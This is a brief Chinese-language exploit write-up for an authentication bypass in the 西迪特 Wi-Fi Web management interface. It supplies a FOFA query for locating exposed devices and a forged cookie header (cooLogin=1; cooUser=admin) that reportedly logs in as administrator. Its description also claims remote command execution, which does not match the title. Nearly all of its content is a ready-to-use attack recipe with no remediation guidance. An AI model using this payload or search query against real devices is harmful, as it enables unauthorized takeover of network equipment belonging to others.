# 西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞

## 漏洞描述

西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞

## 漏洞影响

```
西迪特 Wi-Fi Web管理
```

## FOFA

```
title=="Wi-Fi Web管理"
```

## 漏洞复现o

登录页面

![image-20220519183944313](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191839372.png)

添加Cookie，即可登录后台

```
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```

![image-20220519184113756](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191841849.png)